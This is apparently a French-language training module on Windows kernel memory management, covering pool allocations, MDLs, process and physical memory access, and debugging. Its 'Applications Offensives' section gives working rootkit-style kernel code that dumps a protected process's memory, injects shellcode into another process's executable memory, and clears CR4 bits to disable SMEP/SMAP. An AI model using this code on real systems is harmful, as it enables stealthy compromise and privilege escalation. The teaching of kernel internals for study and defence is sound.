# Module W72 : Gestion Memoire Kernel

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre les zones memoire du kernel Windows
- Utiliser les pool allocations (Paged/NonPaged)
- Manipuler les Memory Descriptor Lists (MDL)
- Mapper de la memoire user-mode vers kernel-mode
- Comprendre les risques de securite lies a la gestion memoire

## Prerequis

Avant de commencer ce module, assurez-vous de maitriser :
- Les bases du langage C (variables, fonctions, pointeurs)
- Module W71 (Driver Basics)
- Concepts de memoire virtuelle
- Pointeurs et adressage memoire

## 1. Architecture Memoire Kernel

### 1.1 Layout Memoire Windows

```
WINDOWS x64 MEMORY LAYOUT:

0x00000000'00000000  ┌─────────────────────────────┐
                     │   USER MODE SPACE           │
                     │   (Per-Process)             │
                     │                             │
                     │   - Program Code            │
                     │   - Stack                   │
                     │   - Heap                    │
                     │   - DLLs                    │
0x00007FFF'FFFFFFFF  ├─────────────────────────────┤
                     │   Non-Canonical Address     │
0xFFFF8000'00000000  ├─────────────────────────────┤
                     │   KERNEL MODE SPACE         │
                     │   (Shared)                  │
                     │                             │
                     │   - System Code             │
                     │   - Drivers                 │
                     │   - Paged Pool              │
                     │   - NonPaged Pool           │
                     │   - System Cache            │
0xFFFFFFFF'FFFFFFFF  └─────────────────────────────┘

Notes importantes:
- User mode : 0x0000000000000000 - 0x00007FFFFFFFFFFF (128 TB)
- Kernel mode : 0xFFFF800000000000 - 0xFFFFFFFFFFFFFFFF (128 TB)
- Acces kernel depuis user-mode = BSOD
```

### 1.2 Zones Memoire Kernel

```
KERNEL MEMORY REGIONS:

┌────────────────────────────────────────┐
│  NONPAGED POOL                         │
│  - Toujours en RAM                     │
│  - Accessible a IRQL eleve             │
│  - Limite (critere de stabilite)       │
│  - Utilise pour : spinlocks, DPC, etc. │
└────────────────────────────────────────┘

┌────────────────────────────────────────┐
│  PAGED POOL                            │
│  - Peut etre swap sur disque           │
│  - IRQL <= APC_LEVEL uniquement        │
│  - Plus grande taille disponible       │
│  - Utilise pour : buffers, structures  │
└────────────────────────────────────────┘

┌────────────────────────────────────────┐
│  SYSTEM CACHE                          │
│  - Cache de fichiers                   │
│  - Mappe vers fichiers disque          │
└────────────────────────────────────────┘

┌────────────────────────────────────────┐
│  SYSTEM PTEs                           │
│  - Page Table Entries systeme          │
│  - Mapping dynamique                   │
└────────────────────────────────────────┘
```

## 2. Pool Allocations

### 2.1 Types de Pools

Imaginez le pool comme un parking :
- **NonPaged Pool** : Places reservees (toujours disponibles)
- **Paged Pool** : Places normales (peuvent etre temporairement utilisees ailleurs)

```c
// Types de pools disponibles
typedef enum _POOL_TYPE {
    NonPagedPool = 0,           // Jamais swap, toujours en RAM
    PagedPool = 1,              // Peut etre swap sur disque
    NonPagedPoolMustSucceed = 2, // OBSOLETE - ne plus utiliser
    NonPagedPoolCacheAligned = 4,
    PagedPoolCacheAligned = 5,
    NonPagedPoolSession = 32,
    PagedPoolSession = 33,
    NonPagedPoolNx = 512        // Non-executable (securite)
} POOL_TYPE;
```

### 2.2 Allocation de Memoire

```c
#include <ntddk.h>

// Tag Pool (pour le debugging)
// Visible dans !poolused, PoolMon.exe
#define POOL_TAG 'TpmE'  // "EmpT" a l'envers (little-endian)

// Allocation dans le NonPaged Pool
PVOID AllocateNonPagedMemory(SIZE_T size) {
    PVOID buffer = NULL;

    // ExAllocatePoolWithTag remplace ExAllocatePool (deprecated)
    buffer = ExAllocatePoolWithTag(
        NonPagedPoolNx,    // Type de pool (NX = Non-Executable)
        size,              // Taille en octets
        POOL_TAG           // Tag pour identification
    );

    if (buffer == NULL) {
        DbgPrint("[!] Allocation failed: size=%llu\n", size);
        return NULL;
    }

    DbgPrint("[+] Allocated %llu bytes at %p\n", size, buffer);

    // Initialiser a zero (bonne pratique)
    RtlZeroMemory(buffer, size);

    return buffer;
}

// Liberation de memoire
VOID FreePoolMemory(PVOID buffer) {
    if (buffer != NULL) {
        ExFreePoolWithTag(buffer, POOL_TAG);
        DbgPrint("[+] Memory freed at %p\n", buffer);
    }
}

// Exemple d'utilisation
NTSTATUS ExamplePoolAllocation() {
    PVOID myBuffer = NULL;
    SIZE_T bufferSize = 4096; // 4 KB

    // Allouer
    myBuffer = AllocateNonPagedMemory(bufferSize);
    if (!myBuffer) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Utiliser le buffer
    RtlCopyMemory(myBuffer, "Hello Kernel!", 14);

    // Liberer
    FreePoolMemory(myBuffer);

    return STATUS_SUCCESS;
}
```

### 2.3 Paged vs NonPaged - Quand Utiliser Quoi?

```c
// UTILISER NONPAGED POOL POUR:
typedef struct _CRITICAL_DATA {
    KSPIN_LOCK SpinLock;        // Spinlocks
    KDPC Dpc;                   // DPC objects
    UNICODE_STRING DeviceName;   // Strings accessed at high IRQL
    FAST_MUTEX FastMutex;       // Fast mutexes
} CRITICAL_DATA, *PCRITICAL_DATA;

// UTILISER PAGED POOL POUR:
typedef struct _NORMAL_DATA {
    LARGE_INTEGER Timestamp;
    WCHAR Username[256];
    ULONG ProcessId;
    LIST_ENTRY ListEntry;
} NORMAL_DATA, *PNORMAL_DATA;

// Allocation appropriee
NTSTATUS AllocateStructures() {
    PCRITICAL_DATA critData = NULL;
    PNORMAL_DATA normData = NULL;

    // Donnees critiques -> NonPaged
    critData = ExAllocatePoolWithTag(
        NonPagedPoolNx,
        sizeof(CRITICAL_DATA),
        'tirC'
    );

    if (critData) {
        KeInitializeSpinLock(&critData->SpinLock);
        KeInitializeDpc(&critData->Dpc, NULL, NULL);
    }

    // Donnees normales -> Paged (plus economique)
    normData = ExAllocatePoolWithTag(
        PagedPool,
        sizeof(NORMAL_DATA),
        'mroN'
    );

    if (normData) {
        normData->ProcessId = 0;
        InitializeListHead(&normData->ListEntry);
    }

    // Cleanup
    if (critData) ExFreePoolWithTag(critData, 'tirC');
    if (normData) ExFreePoolWithTag(normData, 'mroN');

    return STATUS_SUCCESS;
}
```

## 3. Memory Descriptor Lists (MDL)

### 3.1 Qu'est-ce qu'un MDL?

Un MDL est comme un "plan de carte" qui decrit comment des pages memoire
sont organisees. Il permet de mapper de la memoire user-mode dans kernel-mode.

```
MDL STRUCTURE:

User-Mode Address: 0x00000000'12345000
                        │
                        ▼
┌─────────────────────────────────────┐
│  MDL (Memory Descriptor List)       │
│  ┌──────────────────────────────┐  │
│  │ Size                          │  │
│  │ MdlFlags                      │  │
│  │ Process (EPROCESS)            │  │
│  │ MappedSystemVa                │──┼──> 0xFFFF8000'ABCD0000
│  │ StartVa                       │  │    (Kernel address)
│  │ ByteOffset                    │  │
│  │ ByteCount                     │  │
│  │ [PFN Array]                   │  │
│  │   - PFN 1                     │  │
│  │   - PFN 2                     │  │
│  │   - PFN 3                     │  │
│  └──────────────────────────────┘  │
└─────────────────────────────────────┘
        │
        ▼
   Physical Pages (RAM)
```

### 3.2 Creation et Utilisation de MDL

```c
#include <ntddk.h>

// Mapper un buffer user-mode dans kernel-mode
NTSTATUS MapUserBuffer(
    PVOID UserBuffer,
    SIZE_T BufferSize,
    PVOID* KernelBuffer
) {
    PMDL mdl = NULL;
    PVOID mappedAddress = NULL;

    __try {
        // 1. Creer le MDL
        mdl = IoAllocateMdl(
            UserBuffer,     // Adresse virtuelle user-mode
            (ULONG)BufferSize,
            FALSE,          // Pas de MDL secondaire
            FALSE,          // Pas de charge de quota
            NULL            // Pas d'IRP associe
        );

        if (mdl == NULL) {
            DbgPrint("[!] IoAllocateMdl failed\n");
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        DbgPrint("[+] MDL created: %p\n", mdl);

        // 2. Prober et locker les pages en memoire
        //    (Garantit qu'elles ne seront pas swap)
        MmProbeAndLockPages(
            mdl,
            UserMode,       // Mode d'acces
            IoReadAccess    // Type d'acces (Read/Write/ModifyAccess)
        );

        DbgPrint("[+] Pages locked\n");

        // 3. Mapper dans l'espace kernel
        mappedAddress = MmGetSystemAddressForMdlSafe(
            mdl,
            NormalPagePriority | MdlMappingNoExecute
        );

        if (mappedAddress == NULL) {
            MmUnlockPages(mdl);
            IoFreeMdl(mdl);
            DbgPrint("[!] MmGetSystemAddressForMdlSafe failed\n");
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        DbgPrint("[+] Mapped at kernel address: %p\n", mappedAddress);

        // Maintenant on peut acceder au buffer user-mode de maniere securisee
        *KernelBuffer = mappedAddress;

        // Note: Il faut garder le MDL pour cleanup plus tard
        // Dans un vrai driver, stocker mdl dans une structure

        return STATUS_SUCCESS;

    } __except(EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[!] Exception during MDL operations\n");

        if (mdl) {
            if (mappedAddress) {
                MmUnlockPages(mdl);
            }
            IoFreeMdl(mdl);
        }

        return STATUS_INVALID_USER_BUFFER;
    }
}

// Cleanup du MDL
VOID UnmapUserBuffer(PMDL Mdl) {
    if (Mdl) {
        MmUnlockPages(Mdl);
        IoFreeMdl(Mdl);
        DbgPrint("[+] MDL cleaned up\n");
    }
}
```

### 3.3 Exemple Complet - Lecture Buffer User-Mode

```c
// Structure pour stocker le contexte
typedef struct _BUFFER_CONTEXT {
    PMDL Mdl;
    PVOID KernelVa;
    SIZE_T Size;
} BUFFER_CONTEXT, *PBUFFER_CONTEXT;

// Handler IOCTL qui lit un buffer user-mode
NTSTATUS HandleReadUserBuffer(
    PVOID InputBuffer,
    ULONG InputBufferLength
) {
    NTSTATUS status = STATUS_SUCCESS;
    PBUFFER_CONTEXT ctx = NULL;
    PVOID kernelBuffer = NULL;

    DbgPrint("[*] Reading user buffer: %p, size: %u\n",
             InputBuffer, InputBufferLength);

    // Allouer le contexte
    ctx = ExAllocatePoolWithTag(
        NonPagedPoolNx,
        sizeof(BUFFER_CONTEXT),
        'xtCB'
    );

    if (!ctx) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    RtlZeroMemory(ctx, sizeof(BUFFER_CONTEXT));

    __try {
        // Creer et mapper le MDL
        ctx->Mdl = IoAllocateMdl(
            InputBuffer,
            InputBufferLength,
            FALSE,
            FALSE,
            NULL
        );

        if (!ctx->Mdl) {
            status = STATUS_INSUFFICIENT_RESOURCES;
            __leave;
        }

        MmProbeAndLockPages(ctx->Mdl, UserMode, IoReadAccess);

        kernelBuffer = MmGetSystemAddressForMdlSafe(
            ctx->Mdl,
            NormalPagePriority | MdlMappingNoExecute
        );

        if (!kernelBuffer) {
            status = STATUS_INSUFFICIENT_RESOURCES;
            __leave;
        }

        ctx->KernelVa = kernelBuffer;
        ctx->Size = InputBufferLength;

        // Maintenant on peut lire le buffer en toute securite
        DbgPrint("[+] First 16 bytes:\n");
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                   "   %02X %02X %02X %02X %02X %02X %02X %02X "
                   "%02X %02X %02X %02X %02X %02X %02X %02X\n",
                   ((PUCHAR)kernelBuffer)[0], ((PUCHAR)kernelBuffer)[1],
                   ((PUCHAR)kernelBuffer)[2], ((PUCHAR)kernelBuffer)[3],
                   ((PUCHAR)kernelBuffer)[4], ((PUCHAR)kernelBuffer)[5],
                   ((PUCHAR)kernelBuffer)[6], ((PUCHAR)kernelBuffer)[7],
                   ((PUCHAR)kernelBuffer)[8], ((PUCHAR)kernelBuffer)[9],
                   ((PUCHAR)kernelBuffer)[10], ((PUCHAR)kernelBuffer)[11],
                   ((PUCHAR)kernelBuffer)[12], ((PUCHAR)kernelBuffer)[13],
                   ((PUCHAR)kernelBuffer)[14], ((PUCHAR)kernelBuffer)[15]);

    } __finally {
        // Cleanup
        if (ctx->Mdl) {
            if (ctx->KernelVa) {
                MmUnlockPages(ctx->Mdl);
            }
            IoFreeMdl(ctx->Mdl);
        }

        if (ctx) {
            ExFreePoolWithTag(ctx, 'xtCB');
        }
    }

    return status;
}
```

## 4. Acces Memoire Processus

### 4.1 Attach to Process

```c
#include <ntddk.h>

// Lire la memoire d'un autre processus
NTSTATUS ReadProcessMemory(
    HANDLE ProcessId,
    PVOID Address,
    PVOID Buffer,
    SIZE_T Size
) {
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS process = NULL;
    KAPC_STATE apcState;
    SIZE_T bytesRead = 0;

    // 1. Obtenir EPROCESS du processus cible
    status = PsLookupProcessByProcessId(ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] PsLookupProcessByProcessId failed: 0x%X\n", status);
        return status;
    }

    DbgPrint("[+] Found process: %p\n", process);

    __try {
        // 2. Attacher au contexte du processus
        //    (Switcher vers son espace d'adressage)
        KeStackAttachProcess(process, &apcState);

        DbgPrint("[*] Attached to process context\n");

        // 3. Prober l'adresse (verifier accessibilite)
        ProbeForRead(Address, Size, 1);

        // 4. Copier la memoire
        RtlCopyMemory(Buffer, Address, Size);
        bytesRead = Size;

        DbgPrint("[+] Read %llu bytes from %p\n", bytesRead, Address);

    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        DbgPrint("[!] Exception reading memory: 0x%X\n", status);
    }

    // 5. Detacher du processus
    if (AbnormalTermination() == FALSE) {
        KeUnstackDetachProcess(&apcState);
        DbgPrint("[*] Detached from process\n");
    }

    // 6. Dereferencer l'objet process
    ObDereferenceObject(process);

    return status;
}

// Ecrire dans la memoire d'un processus
NTSTATUS WriteProcessMemory(
    HANDLE ProcessId,
    PVOID Address,
    PVOID Buffer,
    SIZE_T Size
) {
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS process = NULL;
    KAPC_STATE apcState;

    status = PsLookupProcessByProcessId(ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    __try {
        KeStackAttachProcess(process, &apcState);

        // Prober pour ecriture
        ProbeForWrite(Address, Size, 1);

        // Ecrire
        RtlCopyMemory(Address, Buffer, Size);

        DbgPrint("[+] Wrote %llu bytes to %p\n", Size, Address);

    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        DbgPrint("[!] Exception writing memory: 0x%X\n", status);
    }

    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(process);

    return status;
}
```

### 4.2 Manipulation Memoire Physique

```c
// Mapper une page physique dans l'espace kernel
PVOID MapPhysicalMemory(
    PHYSICAL_ADDRESS PhysicalAddress,
    SIZE_T Size
) {
    PVOID virtualAddress = NULL;

    // MmMapIoSpace pour mapper memoire physique
    virtualAddress = MmMapIoSpace(
        PhysicalAddress,
        Size,
        MmNonCached  // Type de cache (NonCached/Cached/WriteCombined)
    );

    if (virtualAddress) {
        DbgPrint("[+] Mapped physical 0x%llX to virtual %p\n",
                 PhysicalAddress.QuadPart, virtualAddress);
    }

    return virtualAddress;
}

// Unmapper
VOID UnmapPhysicalMemory(PVOID VirtualAddress, SIZE_T Size) {
    if (VirtualAddress) {
        MmUnmapIoSpace(VirtualAddress, Size);
        DbgPrint("[+] Unmapped virtual address %p\n", VirtualAddress);
    }
}

// Lire memoire physique
NTSTATUS ReadPhysicalMemory(
    PHYSICAL_ADDRESS PhysicalAddress,
    PVOID Buffer,
    SIZE_T Size
) {
    PVOID mapped = NULL;

    mapped = MapPhysicalMemory(PhysicalAddress, Size);
    if (!mapped) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    __try {
        RtlCopyMemory(Buffer, mapped, Size);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        UnmapPhysicalMemory(mapped, Size);
        return STATUS_UNSUCCESSFUL;
    }

    UnmapPhysicalMemory(mapped, Size);
    return STATUS_SUCCESS;
}
```

## 5. Securite et Considerations

### 5.1 Problemes Communs

```c
// MAUVAIS : Fuite memoire
NTSTATUS BadExample1() {
    PVOID buffer = ExAllocatePoolWithTag(NonPagedPoolNx, 1024, 'daB1');

    if (SomeCondition()) {
        return STATUS_UNSUCCESSFUL; // FUITE! buffer jamais libere
    }

    ExFreePoolWithTag(buffer, 'daB1');
    return STATUS_SUCCESS;
}

// BON : Cleanup systematique
NTSTATUS GoodExample1() {
    NTSTATUS status = STATUS_SUCCESS;
    PVOID buffer = NULL;

    buffer = ExAllocatePoolWithTag(NonPagedPoolNx, 1024, 'dooG');
    if (!buffer) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    if (SomeCondition()) {
        status = STATUS_UNSUCCESSFUL;
        goto cleanup;
    }

    // Operations...

cleanup:
    if (buffer) {
        ExFreePoolWithTag(buffer, 'dooG');
    }
    return status;
}

// MAUVAIS : Acces sans verification
NTSTATUS BadExample2(PVOID UserBuffer) {
    ULONG value = *(PULONG)UserBuffer; // DANGER! Peut crasher
    return STATUS_SUCCESS;
}

// BON : Prober avant acces
NTSTATUS GoodExample2(PVOID UserBuffer) {
    ULONG value = 0;

    __try {
        ProbeForRead(UserBuffer, sizeof(ULONG), sizeof(ULONG));
        value = *(PULONG)UserBuffer;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_INVALID_USER_BUFFER;
    }

    return STATUS_SUCCESS;
}
```

### 5.2 Pool Tagging Best Practices

```c
// Tags pools pour debugging
#define TAG_DEVICE_EXTENSION   'xvED'  // "DEvx"
#define TAG_USER_BUFFER        'fBsU'  // "UsBf"
#define TAG_PROCESS_INFO       'fnIP'  // "PInf"
#define TAG_REGISTRY_DATA      'gReR'  // "ReRg"

// Utiliser des tags significatifs
PVOID AllocateDeviceExtension(SIZE_T Size) {
    return ExAllocatePoolWithTag(
        NonPagedPoolNx,
        Size,
        TAG_DEVICE_EXTENSION
    );
}

// Verification avec PoolMon.exe
// > poolmon.exe
// Tag   Paged    NonPaged
// DEvx  0        4096      <- Notre allocation visible ici
```

## 6. Applications Offensives

### 6.1 Dumper Memoire Processus

```c
// Rootkit: Dumper la memoire d'un processus protege
NTSTATUS DumpProtectedProcess(ULONG ProcessId, PVOID OutputBuffer, SIZE_T Size) {
    NTSTATUS status;
    PEPROCESS process = NULL;
    KAPC_STATE apcState;
    PVOID dumpBuffer = NULL;

    DbgPrint("[*] Attempting to dump PID %u\n", ProcessId);

    // Allouer buffer temporaire
    dumpBuffer = ExAllocatePoolWithTag(NonPagedPoolNx, Size, 'pmuD');
    if (!dumpBuffer) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(dumpBuffer, 'pmuD');
        return status;
    }

    __try {
        // Attacher au processus cible
        KeStackAttachProcess(process, &apcState);

        // Dumper la memoire (bypass protection user-mode)
        // Adresse 0x400000 = base executable typique
        RtlCopyMemory(dumpBuffer, (PVOID)0x400000, Size);

        // Detacher
        KeUnstackDetachProcess(&apcState);

        // Copier vers output
        RtlCopyMemory(OutputBuffer, dumpBuffer, Size);

        DbgPrint("[+] Dumped %llu bytes from PID %u\n", Size, ProcessId);

    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = STATUS_UNSUCCESSFUL;
        DbgPrint("[!] Exception during dump\n");
    }

    ExFreePoolWithTag(dumpBuffer, 'pmuD');
    ObDereferenceObject(process);

    return status;
}
```

### 6.2 Injection Memoire Kernel-to-User

```c
// Injecter du code dans un processus user-mode
NTSTATUS InjectCodeIntoProcess(
    ULONG ProcessId,
    PVOID Shellcode,
    SIZE_T ShellcodeSize
) {
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS process = NULL;
    KAPC_STATE apcState;
    PVOID allocatedMemory = NULL;

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    __try {
        KeStackAttachProcess(process, &apcState);

        // Allouer memoire dans le processus cible
        SIZE_T regionSize = ShellcodeSize;
        status = ZwAllocateVirtualMemory(
            ZwCurrentProcess(),
            &allocatedMemory,
            0,
            &regionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!NT_SUCCESS(status)) {
            __leave;
        }

        DbgPrint("[+] Allocated memory at %p in PID %u\n",
                 allocatedMemory, ProcessId);

        // Copier le shellcode
        RtlCopyMemory(allocatedMemory, Shellcode, ShellcodeSize);

        DbgPrint("[+] Shellcode injected successfully\n");

        // Note: Pour executer, creer un thread avec PsCreateSystemThread
        // ou via APC injection (module suivant)

    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = STATUS_UNSUCCESSFUL;
    }

    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(process);

    return status;
}
```

### 6.3 Bypass SMEP/SMAP

```c
// SMEP: Supervisor Mode Execution Prevention
// SMAP: Supervisor Mode Access Prevention

// Desactiver temporairement SMEP/SMAP (pour exploitation)
VOID DisableSMEP() {
    ULONG_PTR cr4;

    // Lire CR4
    cr4 = __readcr4();

    DbgPrint("[*] Original CR4: 0x%llX\n", cr4);

    // Bit 20 = SMEP, Bit 21 = SMAP
    cr4 &= ~(1ULL << 20); // Clear SMEP
    cr4 &= ~(1ULL << 21); // Clear SMAP

    // Ecrire CR4 (necessite Ring 0)
    __writecr4(cr4);

    DbgPrint("[+] SMEP/SMAP disabled\n");
}

VOID EnableSMEP() {
    ULONG_PTR cr4 = __readcr4();

    cr4 |= (1ULL << 20); // Set SMEP
    cr4 |= (1ULL << 21); // Set SMAP

    __writecr4(cr4);

    DbgPrint("[+] SMEP/SMAP re-enabled\n");
}
```

## 7. Debugging Memoire

### 7.1 Pool Monitoring

```bat
REM Surveiller l'utilisation des pools
poolmon.exe

REM Filtrer par tag
poolmon.exe -iTpmE

REM WinDbg commands
!poolused           # Vue d'ensemble
!pool <address>     # Details d'une allocation
!poolfind <tag>     # Trouver allocations par tag
```

### 7.2 Verifier MDL

```
WinDbg commands pour MDL:

!mdl <address>      # Afficher structure MDL
dt nt!_MDL          # Definition de la structure

Example output:
   +0x000 Next             : (null)
   +0x008 Size             : 0x28
   +0x00a MdlFlags         : 0x5
   +0x00c AllocationProcessorNumber : 0
   +0x00e Reserved         : 0
   +0x010 Process          : 0xffff8000`12345678
   +0x018 MappedSystemVa   : 0xfffff800`abcd0000
   +0x020 StartVa          : 0x00000000`12345000
   +0x028 ByteCount        : 0x1000
   +0x02c ByteOffset       : 0
```

## 8. Checklist Kernel Memory

```
[ ] Comprendre layout memoire Windows (User/Kernel)
[ ] Differencier Paged Pool et NonPaged Pool
[ ] Allouer/liberer memoire avec ExAllocatePoolWithTag
[ ] Utiliser les pool tags pour debugging
[ ] Creer et manipuler des MDL
[ ] Mapper buffers user-mode vers kernel-mode
[ ] Utiliser KeStackAttachProcess pour acces processus
[ ] Comprendre les risques (fuites memoire, BSOD)
[ ] Monitorer pools avec PoolMon
[ ] Debugger allocations avec WinDbg
```

## 9. Exercices

Voir [exercice.md](exercice.md)

## Ressources Complementaires

- Windows Internals Part 1 (Chapter 5: Memory Management)
- MSDN: Memory Management for Windows Drivers
- OSR Online: Pool Allocation Best Practices
- Intel: x64 Memory Management
- ReactOS: Memory Manager Source Code

---

**Navigation**
- [Module precedent](../W71_driver_basics/)
- [Module suivant](../W73_ioctl_communication/)
